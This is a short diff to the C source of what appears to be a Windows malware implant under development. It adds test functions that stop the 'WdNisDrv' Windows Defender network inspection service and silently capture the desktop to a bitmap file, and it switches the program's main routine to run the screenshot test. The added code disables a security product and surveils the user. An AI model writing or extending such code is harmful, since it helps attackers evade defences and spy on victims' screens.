@@ -2414,6 +2414,15 @@ void test143(void) {
 	CreateServiceHandler(&Envelope);
 }
 
+void test144(void) {
+	StopService("WdNisDrv", NULL);
+}
+
+void test145(void) {
+	PBUFFER pBitmap = CaptureDesktop(NULL);
+	WriteToFile(L"C:\\Users\\Admin\\Desktop\\screenshot.bmp", pBitmap->pBuffer, pBitmap->cbBuffer);
+}
+
 BOOL IsExist
 (
 	PGLOBAL_CONFIG pConfig
@@ -2847,7 +2856,9 @@ int WinMain
 	//test141();
 	//test142();
 	//test143();
-	Final();
+	//test144();
+	test145();
+	//Final();
 	//WaitForSingleObject(hThread, INFINITE);
 CLEANUP:
 	if (hThread != NULL) {
